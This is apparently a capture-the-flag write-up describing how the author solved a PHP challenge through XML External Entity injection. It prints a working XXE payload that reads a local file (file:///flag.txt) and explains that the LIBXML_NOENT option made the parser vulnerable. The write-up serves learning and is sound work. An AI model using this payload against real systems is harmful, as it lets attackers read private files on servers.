
This was a fun one to learn!

First of all, it was _incredibly_ hard to just get any input at all to validate. <br>
I kept searching for examples of valid XML, or HTML, plugging them in; and it wouldn't work.

I thought even the [php docs](https://www.php.net/manual/en/domdocument.validate.php) were bad, they had some kind of incomplete xml example
that they used on the documentation for `validate`:

```php
<?php
$dom = new DOMDocument;
$dom->load('book.xml');
if ($dom->validate()) {
    echo "This document is valid!\n";
}
?>
```
_What the hell was `book.xml`?_

Turns out, I needed to dig [a bit deeper](https://www.php.net/manual/en/dom.examples.php) into the docs...

But soon, I did find an example that was more [manageable](https://www.w3schools.com/xml/xml_dtd_intro.asp):

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
]>
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<body>Don't forget me this weekend</body>
</note>
```

Finally, OWASP has some good documentation on [XML Entity injection](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing).
This is what drove me to the finish line, with an xml document that looked like so:
```xml
<?xml version="1.0"?>
<!DOCTYPE root[
        <!ELEMENT root (#PCDATA)>
        <!ENTITY foo SYSTEM "file:///flag.txt">
]>
<root>&foo;</root>
```

We end up lucking out a little, because of the options that were passed to `loadXML`. 
On the other side of the coin, we should have looked at the documentation related to each
of the options; we would have easily found `LIBXML_NOENT` is related to XXE.

